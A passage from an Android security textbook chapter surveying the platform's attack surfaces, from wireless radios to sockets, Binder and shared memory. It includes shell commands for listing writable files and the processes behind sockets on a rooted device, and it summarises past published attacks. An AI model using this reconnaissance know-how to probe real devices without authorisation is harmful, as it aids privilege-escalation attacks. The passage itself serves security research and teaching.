functionality\nof their application while Bouncer was watching. Later, the same application\nexecuting on a user’s phone could commence its malicious activities.\nNicholas Percoco published similar research in his Blackhat 2012 white paper\n“Adventures in Bouncerland,” but instead of detecting Bouncer’s presence, his\ntechniques involved developing an application with functionality that justi-\nfi ed permissions for the download and execution of malicious JavaScript. The\napplication was a web-backed, user-confi gurable SMS blocking application.\nWith permissions to access the web and download JavaScript, the backend web\nserver ostensibly became a command and control server that fed the application\nmalicious code at runtime. Percoco’s research also demonstrated that relatively\nminor updates made to a new release of an app can go relatively unnoticed as\nhaving malicious content.\nEven excluding these very interesting techniques for evading Bouncer, mali-\ncious applications still manage to surface on Google Play. There is a burgeoning\nmalware and spyware world for default-confi gured Android devices. Because\ndevices can be confi gured to allow installing apps from third parties, the major-\nity of malicious applications are found there.\nGoogle Phones Home\nBehind the scenes, Android devices connect to Google’s infrastructure through\na service called GTalkService. It is implemented using Google’s ProtoBufs\nc05.indd 01:17:1:PM 02/24/2014 Page 152\nChapter 5 ■ Understanding Android’s Attack Surface 153\ntransport and connects a device to many of Google’s back-end services. For\nexample, Google Play and Gmail use this service to access data in the cloud.\nGoogle made Cloud to Device Messaging (C2DM), which uses GTalkService,\navailable in Android 2.2. In June 2012, Google deprecated C2DM in favor of\nGoogle Cloud Messaging (GCM). GCM continues to use GTalkService for cloud\ncommunications. A more specifi c example involves installing applications from\nthe Google Play website as shown in Figure 5-5.\nFigure 5-5: Installing an application from the web\nApart from user-initiated installation, one of those most interesting proper-\nties of GTalkService is that it allows Google to install and remove applications\nat its own will. In fact, it is possible to do so silently without notifying the end\nuser. In the past, Google used this mechanism as an emergency mechanism to\nremove confi rmed malicious applications from the entire device pool at once.\nAlso, it has been used to push applications onto the device as well. In 2013,\nGoogle launched an initiative to provide APIs to older devices called Google\nPlay Services. In doing so, Google installed a new application on all Android\ndevices to provide this functionality.\nAlthough GTalkService represents an interesting attack surface, vectors into\nit require trusted access. This functionality’s connection to the cloud is secured\nusing certifi cate-pinned SSL. This limits attacks to those that come from within\nGoogle’s own back end. That said, leveraging Google’s back end to conduct\nattacks is not entirely impossible.\nUnfortunately, diving deeper into the attack surface exposed by GTalkService\nrequires signifi cant reverse-engineering effort. The components that implement\nc05.indd 01:17:1:PM 02/24/2014 Page 153\n154 Chapter 5 ■ Understanding Android’s Attack Surface\nthis part of Android devices are closed source and aren’t part of Android\nOpen Source Project (AOSP). Inspecting them requires the use of disassem-\nblers, decompilers, and other specialized tools. A good starting point is to\nreverseengineer the Google Play application or the GTalkService itself.\nJon Oberheide demonstrated two separate attacks that utilized GTalkService\nto compromise devices. The fi rst, at SummerCon 2010, showed that it was pos-\nsible to access the authentication token used to maintain the persistent back-end\nconnection via the com.accounts.AccountManager API. Malicious applications\ncould use this to initiate application installs without prompting or reviewing\napplication permissions. More information on this attack is available at https://\njon.oberheide.org/blog/2011/05/28/when-angry-birds-attack-android-\nedition/. The second attack, discussed in detail at https://jon.oberheide\n.org/blog/2011/03/07/how-i-almost-won-pwn2own-via-xss/, showed that an\nXSS vulnerability in the Google Play website allowed attackers to do the same.\nThis time, however, it was not necessary to install a malicious application. In both\ncases, Oberheide developed proof-of-concept codes to demonstrate the attacks.\nOberheide’s fi ndings are high-impact and fairly straightforward. Exploring this\nattack surface further is an interesting area for future work.\nPhysical Adjacency\nRecall the working defi nition of physical adjacency from the “Adjacency” section\nearlier in this chapter. Unlike physical attacks, which require directly touching\nthe target device, physically adjacent attacks require that an attacker is within a\ncertain range of her intended victim. Much of this attack surface involves various\ntypes of radio frequency (RF) communications. However, some attack surfaces\nare not related to RF. This section covers wireless supported communications\nchannels in depth and discusses other attack surfaces that are reachable within\ncertain proximities.\nWireless Communications\nAny given Android device supports a multitude of different radio-based wireless\ntechnologies. Almost all devices support Wi-Fi and Bluetooth. Many of those\nalso support Global Positioning System (GPS). Devices able to make cellular\ntelephone calls support one or more of the standard cell technologies, such as\nGlobal System for Mobile communications (GSM) and Code Division Multiple\nAccess (CDMA). Newer Android devices also support Near Field Communication\n(NFC). Each of the supported wireless technologies has specifi c frequencies\nassociated with them and thus is only reachable within certain physical proximi-\nties. The following sections will dive deeper into each technology and explain\nc05.indd 01:17:1:PM 02/24/2014 Page 154\nChapter 5 ■ Understanding Android’s Attack Surface 155\nthe associated access requirements. Before diving into those details, let’s look\nat concepts that apply to all of these mediums.\nAll wireless communications are susceptible to a wide range of attacks, both\nactive and passive. Active attacks require an attacker to interfere with the normal\nfl ow of information and include jamming, spoofi ng, and man-in-the-middle\n(MitM). Because Wi-Fi and cellular networking are used to access the Internet at\nlarge, MitM attacks against these mediums provide access to an extremely rich\nattack surface. Passive attacks, like sniffi ng, enable attackers to compromise the\ninformation fl owing through these mediums. Stolen information is powerful.\nFor example, compromising keystrokes, authentication credentials, fi nancial\ndata, or otherwise can lead to further and more impactful attacks.\nGPS\nGPS, which is often referred to as location data in Android, allows a device to\ndetermine where it is on the planet. It works based on signals from satellites that\norbit the planet. The GPS receiver chip receives these signals, amplifi es them,\nand determines its location based on the result. Most people know GPS because\nit is often used to enable turn-by-turn navigation. In fact, devices designed\nspecifi cally for navigation are often called GPS devices. In modern times, GPS\nhas become an important tool in travelers’ toolboxes.\nHowever, having GPS so widely available is not without controversy. Though\nGPS is a one-way communications mechanism, location data is exposed to\nAndroid applications through the Android Framework (android.location API)\nand Google Play Services (Location Services API). Regardless of which API is\nused, many Android applications do not respect end-user privacy and instead\nmonitor the user’s location. Some of the authors of such apps are believed to sell\naccess to the data to unknown third parties. This practice is truly concerning.\nUnder the hood, the hardware and software that implements GPS varies from\none device to the next. Some devices have a dedicated chip that provides GPS\nsupport while others have GPS support integrated into the System-on-Chip\n(SoC). The software that supports the hardware varies accordingly and is usu-\nally closed source and proprietary. This fact makes enumerating and digging\ndeeper into the exposed attack surface diffi cult, time consuming, and device\nspecifi c. Like any other communications mechanism, software that deals with\nthe radio itself represents a direct attack surface. Following the data as it fl ows\nup the software stack, additional attack surfaces exist.\nBecause GPS signals emanate from outer space, an attacker could theoretically\nbe very far away from his target device. However, there are no known attacks\nthat compromise an Android device via the GPS radio. Because Android devices\ndon’t use GPS for security, such as authentication, the possibilities are limited.\nThe only known attacks that involve location data are spoofi ng attacks. These\nc05.indd 01:17:1:PM 02/24/2014 Page 155\n156 Chapter 5 ■ Understanding Android’s Attack Surface\nattacks could mislead a user using turn-by-turn navigation or allow cheating\nat games that use the location data as part of their logic.\nBaseband\nThe single part of a smartphone that sets it apart from other devices the most\nis the ability to communicate with mobile networks. At the lowest level, this\nfunctionality is provided by a cellular modem. This component, often called\nthe baseband processor, might be a separate chip or might be part of the SoC. The\nsoftware that runs on this chip is referred to as the baseband fi rmware. It is one of\nthe software components that comprise the Android telephony stack. Attacks\nagainst the baseband are attractive because of two things: limited visibility to\nthe end user and access to incoming and outgoing cellular voice and data. As\nsuch it represents an attractive attack surface in a smartphone.\nAlthough an attack against the baseband is a remote attack, an attacker must\nbe within a certain proximity to a victim. In typical deployments, the cell modem\ncan be several miles away from the cell tower. Mobile devices will automatically\nconnect to and negotiate with the tower with the strongest signal available.\nBecause of this fact, an attacker only needs to be close enough to the victim to\nappear to be the strongest signal. After the victim associates with the attacker’s\ntower, the attacker can MitM the victim’s traffi c or send attack traffi c as they\ndesire. This type of attack is called a Rogue Base Station attack and has garnered\nquite a bit of interest in recent years.\nAndroid smartphones support several different mobile communications\ntechnologies like GSM, CDMA, and Long Term Evolution (LTE). Each of these\nare made up of a collection of protocols used to communicate between vari-\nous components within a cellular network. To compromise a device, the most\ninteresting protocols are those that are spoken by the device itself. Each protocol\nrepresents an attack vector and the underlying code that processes it represents\nan attack surface.\nDigging deeper into the attack surface exposed by the baseband not only\nrequires intense application of tools like IDA Pro, but also requires access to\nspecialized equipment. Because baseband fi rmware is typically closed source,\nproprietary, and specifi c to the baseband processor in use, reverse-engineering\nand auditing this code is challenging. Communicating with the baseband is only\npossible using sophisticated radio hardware like the Universal Software Radio\nPeripheral (USRP) from Ettus Research or BladeRF from Nuand. However, the\navailability of small, portable base stations like Femtocells and Picopops could\nmake this task easier. When the hardware requirement has been fulfi lled, it’s\nstill necessary to implement the necessary protocols to exercise the attack sur-\nface. The Open Source Mobile Communications (Osmocom) project, as well as\nc05.indd 01:17:1:PM 02/24/2014 Page 156\nChapter 5 ■ Understanding Android’s Attack Surface 157\nseveral other projects, provides open source implementations for some of the\nprotocols involved.\nIn Android, the Radio Interface Layer (RIL) communicates with the baseband\nand exposes cellular functionality to rest of the device. More information about\nRIL is covered in Chapter 11.\nBluetooth\nThe Bluetooth wireless technology widely available on Android devices supports\nquite a bit of functionality and exposes a rich attack surface. It was originally\ndesigned as a wireless alternative to serial communications with relatively low\nrange and power consumption. Although most Bluetooth communications are\nlimited to around 32 feet, the use of antennae and more powerful transmitters\ncan expand the range up to 328 feet. This makes attacks against Bluetooth the\nthird-longest-range wireless medium for attacking Android devices.\nMost mobile device users are familiar with Bluetooth due to the popularity of\nBluetooth headsets. Many users do not realize that Bluetooth actually includes\nmore than 30 profi les, each of which describes a particular capability of a Bluetooth\ndevice. For example, most Bluetooth headsets use the Hands-Free Profi le (HFP)\nand/or Headset Profi le (HSP). These profi les give the connected device control\nover the device’s speaker, microphone and more. Other commonly used profi les\ninclude File Transfer Profi le (FTP), Dial-up Networking Profi le (DUN), Human\nInterface Device (HID) Profi le, and Audio/Video Remote Control Profi le (AVRCP).\nThough a full examination of all profi les is outside the scope of this book, we\nrecommend you do more research for a full understanding of the extent of the\nattack surface exposed by Bluetooth.\nMuch of the functionality of the various Bluetooth profi les requires going\nthrough the pairing process. Usually the process involves entering a numeric\ncode on both devices to confi rm that they are indeed talking to each other. Some\ndevices have hard-coded codes and therefore are easier to attack. After a pairing\nis created, it’s possible to hijack the session and abuse it. Possible attacks include\nBluejacking, Bluesnarfi ng, and Bluebugging. In addition to being able to pair with\nhands-free devices, Android devices can be paired with one another to enable\ntransferring contacts, fi les, and more. The designed functionality provided by\nBluetooth is extensive and provides access to nearly everything that an attacker\nmight want. Many feasible attacks exploit weaknesses in pairing and encryp-\ntion that is part of the Bluetooth specifi cation. As such, Bluetooth represents a\nrather rich and complicated attack surface to explore further.\nOn Android devices, the attack surface exposed by Bluetooth starts in the\nkernel. There, drivers interface with the hardware and implement several of the\nlow-level protocols involved in the various Bluetooth profi les like Logical Link\nc05.indd 01:17:1:PM 02/24/2014 Page 157\n158 Chapter 5 ■ Understanding Android’s Attack Surface\nControl and Adaptation Protocol (L2CAP) and Radio Frequency Communications\n(RFCOMM). The kernel drivers expose additional functionality to the Android\noperating system through various Inter Process Communication (IPC) mecha-\nnisms. Android used the Bluez user-space Bluetooth stack until Android 4.2\nwhen Google switched to Bluedroid. Next, code within the Android Framework\nimplements the high-level API exposed to Android apps. Each component rep-\nresents a part of the overall attack surface. More information about the Bluetooth\nsubsystem in Android is available at https://source.android.com/devices/\nbluetooth.html.\nWi-Fi\nNearly all Android devices support Wi-Fi in its most basic form. As newer devices\nhave been created, they have kept up with the Wi-Fi standards fairly well. At\nthe time of this writing, the most widely supported standards are 802.11g and\n802.11n. Only a few devices support 802.11ac. Wi-Fi is primarily used to connect\nto LANs, which in turn provide Internet access. It can also be used to connect\ndirectly to other computer systems using Ad-Hoc or Wi-Fi Direct features. The\nmaximum range of a typical Wi-Fi network is about 120 feet, but can easily be\nextended through the use of repeaters or directional antennae.\nIt’s important to note that a full examination of Wi-Fi is beyond the scope of\nthis book. Other published books, including “Hacking Exposed Wireless,” cover\nWi-Fi in more detail and are recommended if you are interested. This section\nattempts to briefl y introduce security concepts in Wi-Fi and explain how they\ncontribute to the attack surface of an Android device.\nWi-Fi networks can be confi gured without authentication or using several dif-\nferent authentication mechanisms of varying strength. Open networks, or those\nwithout authentication, can be monitored wirelessly using completely passive\nmeans (without connecting). Authenticated networks use various encryption\nalgorithms to secure the wireless communications and thus monitoring without\nconnecting (or at least having the key) becomes more diffi cult. The three most\npopular authentication mechanisms are Wired Equivalent Privacy (WEP), Wi-Fi\nProtected Access (WPA), and WPA2. WEP is broken relatively easily and should\nbe considered roughly equivalent to no protection at all. WPA was created to\naddress these weaknesses and WPA2 was created to further harden Wi-Fi\nauthentication and encryption.\nThe Wi-Fi stack on Android is much like the Bluetooth stack. In fact, some\ndevices include a single chip that implements both technologies. Like Bluetooth,\nthe source code for the Wi-Fi stack is open source. It begins with kernel drivers\nc05.indd 01:17:1:PM 02/24/2014 Page 158\nChapter 5 ■ Understanding Android’s Attack Surface 159\nthat manage the hardware (the radio) and handle much of the low-level proto-\ncols. In user-space, wpa_supplicant implements authentication protocols and\nthe Android operating system manages memorized connections. Like Bluetooth,\nthese components are exposed to untrusted data and thus represent an exposed\nattack surface that’s interesting to explore further.\nIn addition to connecting to Wi-Fi access points (APs), most Android devices\nare capable of assuming the AP role, too. In doing so, the device increases its\nattack surface signifi cantly. Additional user-space code, more specifi cally hostapd\nand a DNS server, is spun up and exposed to the network. This increases the\nremote attack surface, especially if an attacker is able to connect to the AP hosted\nby the Android device.\nOther than generic Wi-Fi attacks, no successful attacks against the Wi-Fi stack\nof an Android device are known. Viable generic attacks include rogue hotspots\nand MitM attacks.\nNFC\nNFC is a wireless communications technology that builds upon Radio Frequency\nIdentifi cation (RFID). Of the wireless technologies supported by Android devices,\nNFC has the shortest range, which is typically limited to less than 8 inches.\nThere are three typical use cases for NFC on Android devices. First, tags that\nare usually in the form of stickers are presented to the device, which then reads\nthe tag’s data and processes it. In some cases, such stickers are prominently\ndisplayed in public places as part of interactive advertising posters. Second,\ntwo users touch their Android devices together to beam data, such as a photo.\nFinally, NFC is routinely used for contactless payments.\nThe Android implementation of NFC is fairly straightforward. Figure 5-6\ndepicts an overview of Android’s NFC stack. Kernel drivers speak to the NFC\nhardware. Rather than doing deep processing on received NFC data, the driver\npasses the data to the NFC Service (com.android.nfc) within the Android\nFramework. In turn, the NFC Service delivers the NFC tag data to Android\napps that have registered to be the recipient of NFC messages.\nNFC data comes in several forms, many of which are supported by Android\nby default. All of these supported implementations are very well documented\nin the Android SDK under the TagTechnology class. More information about\nNFC on Android is available at http://developer.android.com/guide/\ntopics/connectivity/nfc/index.html.\nc05.indd 01:17:1:PM 02/24/2014 Page 159\n160 Chapter 5 ■ Understanding Android’s Attack Surface\nNFC Tag\nNFC Tag Data:\n(Nodef, MiFare, etc.)\nNFC Transmitter/Receiver\nAndroid Kernel\nlibpn544_fs.so\nNFC Service (com.android.nfc)\nlibnfc_jni.so libnfc.so libnfc_ndef.so\nAndroid App Android App Android App\nFigure 5-6: NFC on Android\nThe most popular message format is NFC Data Exchange Format (NDEF).\nNDEF messages can contain any data, but are typically used to transmit text,\nphone numbers, contact information, URLs, and images. Parsing these types of\nmessages often results in performing actions such as pairing Bluetooth devices,\nlaunching the web browser, dialer, YouTube, or Maps applications, and more.\nIn some cases these operations are performed without any user interaction,\nwhich is especially attractive to an attacker. When beaming fi les, some devices\nlaunch the default viewer for the received fi le based on its fi le type. Each of\nthese operations is an excellent example of an additional attack surface that\nlies beneath NFC.\nSeveral successful attacks leveraged NFC to compromise Android devices.\nAs demonstrated by Charlie Miller, NFC can be used to automatically set up\nconnections using other wireless technologies such as Bluetooth and Wi-Fi\nDirect. Because of this, it could be used to enable access to an attack surface that\nwould otherwise not be available. Georg Wicherski and Joshua J. Drake dem-\nonstrated a successful browser attack that was launched via NFC at BlackHat\nUSA in 2012. Also, as mentioned earlier, researchers from MWR Labs utilized\nc05.indd 01:17:1:PM 02/24/2014 Page 160\nChapter 5 ■ Understanding Android’s Attack Surface 161\nNFC to exploit a fi le format parsing vulnerability in the Polaris Offi ce document\nsuite at the 2012 Mobile Pwn2Own. These attacks demonstrate that the attack\nsurface exposed by NFC support on Android can defi nitely lead to successful\ndevice compromises.\nOther Technologies\nApart from wireless communications, a couple of other technologies contribute to\nthe overall attack surface of Android devices. More specifi cally, Quick Response\n(QR) codes and voice commands could theoretically lead to a compromise. This\nis especially true in the case of Google Glass—which is based on Android—and\nnewer Android devices like the Moto X and Nexus 5. Early versions of Google\nGlass would process QR codes whenever a picture was taken. Lookout Mobile\nSecurity discovered that a surreptitiously placed QR code could cause Google\nGlass to join a malicious Wi-Fi network. From there, the device could be attacked\nfurther. Additionally, Google Glass makes extensive use of voice commands.\nAn attacker sitting next to a Google Glass user can speak commands to the\ndevice to potentially cause it to visit a malicious website that compromises the\ndevice. Though it is diffi cult to target the underlying implementation of these\ntechnologies, the functionality provided leaves room for abuse and thus a\npotential compromise of the device.\nLocal Attack Surfaces\nWhen an attacker has achieved arbitrary code execution on a device, the next\nlogical step is to escalate privileges. The ultimate goal is to achieve privileged\ncode execution in kernel space or under the root or system user. However, gain-\ning even a small amount of privileges, such as a supplementary group, often\nexposes more restricted attack surfaces. In general, these attack surfaces are the\nmost obvious to examine when attempting to devise new rooting methods. As\nmentioned in Chapter 2, the extensive use of privilege separation means that\nseveral minor escalations might need to be combined in order to achieve the\nultimate goal.\nThis section takes a closer look at the various attack surfaces exposed to code\nthat’s already executing on a device, whether it be an Android app, a shell via\nADB, or otherwise. The privileges required to access these attack surfaces var-\nies depending on how the various endpoints are secured. In an effort to ease\nthe pain associated with the extensive privilege separation used on Android,\nthis section introduces tools that can be used to examine OS privileges and\nenumerate exposed endpoints.\nc05.indd 01:17:1:PM 02/24/2014 Page 161\n162 Chapter 5 ■ Understanding Android’s Attack Surface\nExploring the File System\nAndroid’s Unix lineage means that many different attack surfaces are exposed\nvia entries in the fi le system. These entries include both kernel-space and user-\nspace endpoints. On the kernel side, device driver nodes and special virtual fi le\nsystems provide access to interact directly with kernel-space driver code. Many\nuser-space components, like privileged services, expose IPC functionality via\nsockets in the PF_UNIX family. Further, normal fi le and directory entries with\ninsuffi ciently restricted permissions give way to several attack classes. By sim-\nply inspecting the entries within the fi le system you can fi nd these endpoints,\nexercise the attack surface below them, and potentially escalate your privileges.\nEach fi le system entry has several different properties. First and foremost,\neach entry has a user and group that is said to own it. Next most important is\nthe entry’s permissions. These permissions specify whether the entry can be\nread, written, or executed only by the owning user or group or by any user on\nthe system. Also, several special permissions control type-dependent behav-\niors. For example, an executable that is set-user-id or set-group-id executes with\nelevated privileges. Finally, each entry has a type that tells the system how to\nhandle manipulations to the endpoint. Types include regular fi les, directories,\ncharacter devices, block devices, First-In-First-Out nodes (FIFOs), symbolic links,\nand sockets. It’s important to consider all of these properties when determining\nexactly which attack surfaces are reachable given a particular level of access.\nYou can enumerate fi le system entries easily using the opendir and stat sys-\ntem calls. However, some directories do not allow lesser privileged users to list\ntheir contents (those lacking the read bit). As such, you should enumerate the fi le\nsystem with root privileges. To make it easier to determine fi le system entries\nthat could be interesting, Joshua J. Drake developed a tool called canhazaxs. The\nfollowing excerpt shows this tool in action on a Nexus 4 running Android 4.4.\nroot@mako:/data/local/tmp # ./canhazaxs -u shell -g \\\n1003,1004,1007,1009,1011,1015,1028,3001,3002,3003,3006 /dev /data\n[*] uid=2000(shell),\ngroups=2000(shell),1003(graphics),1004(input),1007(log),1009(mount),1011\n(adb),\n1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),\n3006(net_bw_stats)\n[*] Found 0 entries that are set-uid executable\n[*] Found 1 entries that are set-gid executable\ndirectory 2750 system shell /data/misc/adb\n[*] Found 62 entries that are writable\n[...]\nfile 0666 system system /dev/cpuctl/apps/tasks\n[...]\nchardev 0666 system system /dev/genlock\nc05.indd 01:17:1:PM 02/24/2014 Page 162\nChapter 5 ■ Understanding Android’s Attack Surface 163\n[...]\nsocket 0666 root system /dev/socket/pb\n[...]\ndirectory 0771 shell shell /data/local/tmp\n[...]\nThe -u and -g options passed to canhazaxs correspond to the user and groups\nthat should be considered when determining whether the entry is readable,\nwritable, or executable. After those options, you can specify any number of\ndirectories to inspect. For each of these directories, canhazaxs recursively enu-\nmerates entries in all directories within. After everything is inspected, entries\nthat are accessible are shown prioritized by potential impact. For each entry,\ncanhazaxs shows the type, permissions, user, group, and path. This streamlines\nthe process of enumerating attack surfaces exposed via the fi le system.\nFinding the code behind each endpoint depends on the type of entry. For\nkernel drivers, searching the kernel source code for the specifi c entry’s name,\nas discussed further in Chapter 10, is the best method. It’s diffi cult to fi nd\nexactly what code operates on any particular regular fi le or directory. However,\ninspecting the init.rc and related commands have led to the discovery of\nprivilege escalation vulnerabilities in the past. Determining the code behind\na socket endpoint can be tricky and is discussed further in the “Finding the\nCode Behind a Socket” section later in this chapter. When you fi nd the code, you\ncan determine the functionality provided by the endpoint. The deeper attack\nsurfaces beneath these endpoints present an opportunity to uncover previously\nunknown privilege escalation issues.\nFinding Other Local Attack Surfaces\nNot all local attack surfaces are exposed via entries in the fi le system. Additional\nattack surfaces exposed by the Linux kernel include system calls, socket imple-\nmentations, and more. Many services and apps in Android expose attack surfaces\nlocally through different types of IPC, including sockets and shared memory.\nSystem Calls\nThe Linux kernel has a rich attack surface that is exposed to local attackers.\nApart from things represented by an entry in the fi le system, the Linux kernel\nalso processes potentially malicious data when it executes system calls. As\nsuch, system call handler functions inside the kernel represent an interesting\nattack surface. Finding such functions is easily accomplished by searching for\nthe SYSCALL_DEFINE string within the kernel source code.\nc05.indd 01:17:1:PM 02/24/2014 Page 163\n164 Chapter 5 ■ Understanding Android’s Attack Surface\nSockets\nSoftware running on Android uses various types of sockets to achieve IPC. To\nunderstand the full extent of the attack surface exposed by various types of\nsockets you must fi rst understand how sockets are created. Sockets are created\nusing the socket system call. Although various abstractions for creating and\nmanaging sockets exist throughout Android, all of them eventually use the\nsocket system call. The following excerpt from the Linux manual page shows\nthis system call’s function prototype:\nint socket(int domain, int type, int protocol);\nThe important thing to understand is that creating a socket requires specify-\ning a domain, type, and protocol. The domain parameter is most important as\nits value determines how the protocol parameter is interpreted. More detailed\ninformation about these parameters, including supported values for each, can\nbe found from the Linux manual page for the socket function. Further, it’s\npossible to determine which protocols are supported by an Android device by\ninspecting the /proc/net/protocols fi le system entry:\nshell@ghost:/data/local/tmp $ ./busybox wc -l /proc/net/protocols\n24 /proc/net/protocols\nEach of the entries in this fi le represents an interesting attack surface to\nexplore further. The source code that implements each protocol can be found\nwithin the Linux kernel source in the net subdirectory.\nCommon Socket Domains\nMost Android devices make extensive use of sockets in the PF_UNIX, PF_INET,\nand PF_NETLINK domains. Sockets in the PF_INET domain are further broken\ndown into those that use the SOCK_STREAM and SOCK_DGRAM types, which use\nthe TCP and UDP protocols. Detailed information about the status of instances\nof each type of socket can be obtained via entries in the /proc/net directory\nas depicted in Table 5-2.\nTable 5-2: Status Files for Common Socket Domains\nSOCKET DOMAIN STATUS FILE\nPF_UNIX /proc/net/unix\nPF_INET (SOCK_STREAM) /proc/net/tcp\nPF_INET (SOCK_DGRAM) /proc/net/udp\nPF_NETLINK /proc/net/netlink\nThe fi rst, and most commonly used, socket domain is the PF_UNIX domain.\nMany services expose IPC functionality via sockets in this domain, which\nc05.indd 01:17:1:PM 02/24/2014 Page 164\nChapter 5 ■ Understanding Android’s Attack Surface 165\nexpose endpoints in the fi le system that can be secured using traditional user,\ngroup, and permissions. Because an entry exists in the fi le system, sockets of\nthis type will appear when using the methods discussed in the “Exploring the\nFile System” section earlier in this chapter.\nIn addition to traditional PF_UNIX domain sockets, Android implements a\nspecial type of socket called an Abstract Namespace Socket. Several core system\nservices use sockets in this domain to expose IPC functionality. These sockets\nare similar to PF_UNIX sockets but do not contain an entry in the fi le system.\nInstead, they are identifi ed only by a string and are usually written in the form\n@socketName. For example, the /system/bin/debuggerd program creates an\nabstract socket called @android:debuggerd. These types of sockets are created\nby specifying a NUL byte as the fi rst character when creating a PF_UNIX socket.\nThe characters that follow specify the socket’s name. Because these types of\nsockets do not have a fi le system entry, they cannot be secured in the same\nway as traditional PF_UNIX sockets. This fact makes abstract socket endpoints\nan interesting target for further exploration.\nAny application that wants to talk to hosts on the Internet uses PF_INET sockets.\nOn rare occasions, services and apps use PF_INET sockets to facilitate IPC. As\nshown earlier, this socket domain includes communications that use TCP and\nUDP protocols. To create this type of socket, a process must have access to the\ninet Android ID (AID). This is due to Android’s Paranoid Networking feature\nthat was fi rst discussed in Chapter 2. These types of sockets are especially\ninteresting when used for IPC or to implement a service exposed to the network.\nThe fi nal common type of socket in Android is the PF_NETLINK socket. These\ntypes of sockets are usually used to communicate between kernel-space and\nuser-space. User-space processes, such as /system/bin/vold, listen for events\nthat come from the kernel and process them. As previously discussed in Chapter\n3, the GingerBreak exploit relied on a vulnerability in vold’s handling of a\nmaliciously crafted NETLINK message. Attack surfaces related to PF_NETLINK\nsockets are interesting because they exist in both kernel-space and privileged\nuser-space processes.\nFinding the Code Behind a Socket\nOn typical Linux systems, you can match processes to sockets using the lsof\ncommand or the netstat command with the -p option. Unfortunately, this\ndoesn’t work out of the box on Android devices. That said, using a properly\nbuilt BusyBox binary on a rooted device is able to achieve this task:\nroot@mako:/data/local/tmp # ./busybox netstat -anp | grep /dev/socket/pb\nunix 2 [ ] DGRAM 5361 184/mpdecision\n/dev/socket/pb\nUsing the preceding single command, you are able to discover that /dev/\nsocket/pb is in use by process ID 184 called mpdecision.\nc05.indd 01:17:1:PM 02/24/2014 Page 165\n166 Chapter 5 ■ Understanding Android’s Attack Surface\nIn the event that a properly built BusyBox is not available, you can achieve the\nsame task using a simple three-step process. First, you use the specifi c entries\nwithin the proc fi le system to reveal the process that owns the socket:\nroot@mako:/data/local/tmp # ./busybox head -1 /proc/net/unix\nNum RefCount Protocol Flags Type St Inode Path\nroot@mako:/data/local/tmp # grep /dev/socket/pb /proc/net/unix\n00000000: 00000002 00000000 00000000 0002 01 5361 /dev/socket/pb\nIn this example, you can see the /dev/socket/pb entry inside the special\n/proc/net/unix fi le. The number that appears immediately before the path is\nthe inode number for the fi le system entry. Using the inode, you can see which\nprocess has an open fi le descriptor for that socket:\nroot@mako:/data/local/tmp # ./busybox ls -l /proc/[0-9]*/fd/* | grep 5361\n[...]\nlrwx------ 1 root root 64 Jan 2 22:03 /proc/184/fd/7 ->\nsocket:[5361]\nSometimes this command shows that more than one process is using the socket.\nThankfully, it’s usually obvious which process is the server in these cases. With\nthe process ID in hand, it’s simple to fi nd more information about the process:\nroot@mako:/data/local/tmp # ps 184\nUSER PID PPID VSIZE RSS WCHAN PC NAME\nroot 184 1 7208 492 ffffffff b6ea0908 S /system/bin/mpdecision\nRegardless of whether you use the BusyBox method or the three-step method,\nyou now know where to start looking.\nSockets represent a signifi cant local attack surface due to the ability to commu-\nnicate with privileged processes. The kernel-space code that implements various\ntypes of sockets might allow privilege escalation. Services and applications in\nuser-space that expose socket endpoints might also allow privilege escalation.\nThese attack surfaces represent an interesting place to look for security issues.\nBy locating the code, you can look more closely at the attack surface and begin\nyour journey toward deeper attack surfaces within.\nBinder\nThe Binder driver, as well as software that relies on it, presents an attack surface\nthat is unique to Android. As previously discussed in Chapter 2 and further\nexplored in Chapter 4, the Binder driver is the basis of Intents that are used\nto communicate between app-level Android components. The driver itself is\nimplemented in kernel-space and exposes an attack surface via the /dev/binder\ncharacter device. Then, Dalvik applications communicate with one another\nthrough several levels of abstraction built on top. Although sending Intents\nc05.indd 01:17:1:PM 02/24/2014 Page 166\nChapter 5 ■ Understanding Android’s Attack Surface 167\nfrom native applications is not supported, it is possible to implement a service\nin native code directly on top of Binder. Because of the many ways Binder can\nbe used, researching deeper attack surfaces might ultimately lead to achieving\nprivilege escalation.\nShared Memory\nAlthough Android devices do not use traditional POSIX shared memory, they\ndo contain several shared memory facilities. As with many things in Android,\nwhether a particular facility is supported varies from one device to the next.\nAs introduced in Chapter 2, Android implements a custom shared memory\nmechanism called Anonymous Shared Memory, or ashmem for short. You can\nfi nd out which processes are communicating using ashmem by looking at the\nopen fi le descriptors in the /proc fi le system:\nroot@mako:/data/local/tmp # ./busybox ls -ld /proc/[0-9]*/fd/* | \\\ngrep /dev/ashmem | ./busybox awk -F/ ‘{print $3}’ | ./busybox sort -u\n[...]\n176\n31897\n31915\n596\n686\n856\nIn addition to ashmem, other shared memory facilities—for example, Google’s\npmem, Nvidia’s NvMap, and ION—exist on only a subset of Android devices.\nRegardless of which facility is used, any shared memory used for IPC represents\na potentially interesting attack surface.\nBaseband Interface\nAndroid smartphones contain a second operating system known as the baseband.\nIn some devices the baseband runs on an entirely separate physical central pro-\ncessing unit (CPU). In others, it runs in an isolated environment on a dedicated\nCPU core. In either situation, the Android operating system must be able to speak\nto baseband in order to make and receive calls, text messages, mobile data, and\nother communications that traverse the mobile network. The exposed endpoint,\nwhich varies from one device to the next, is considered an attack surface of the\nbaseband itself. Accessing this endpoint usually requires elevated privileges\nsuch as to the radio user or group. It’s possible to determine exactly how the\nbaseband is exposed by looking at the rild process. More information about\nAndroid’s Telephony stack, which abstracts access to the baseband interface, is\npresented in Chapter 11.\nc05.indd 01:17:1:PM 02/24/2014 Page 167\n168 Chapter 5 ■ Understanding Android’s Attack Surface\nAttacking Hardware Support Services\nA majority of Android devices contain myriad peripheral devices. Examples\ninclude GPS transceivers, ambient light sensors, and gyroscopes. The Android\nFramework exposes a high-level API to access information provided by these\nperipherals to Android applications. These APIs represent an interesting attack\nsurface because data passed to them might be processed by privileged services\nor even the peripheral itself. The exact architecture for any given peripheral\nvaries from one device to the next. Because of the layers between the API and\nthe peripherals, the exposed API attack surface serves as an excellent example\nof how deeper attack surfaces lie beneath more shallow ones. A more thorough\nexamination of this set of attack surfaces is beyond the scope of this book.\nPhysical Attack Surfaces\nAttacks that require physically touching a device are said to lie within the physical\nattack surface. This is in contrast to physical adjacency where the attacker only\nneeds to be within a certain range of the target. Attacking a mobile device using\nphysical access may seem less exotic and easier than other attacks. In fact, most\nview physical attacks as being impossible to defend against. Consequently, you\nmight feel compelled to categorize these attacks as low 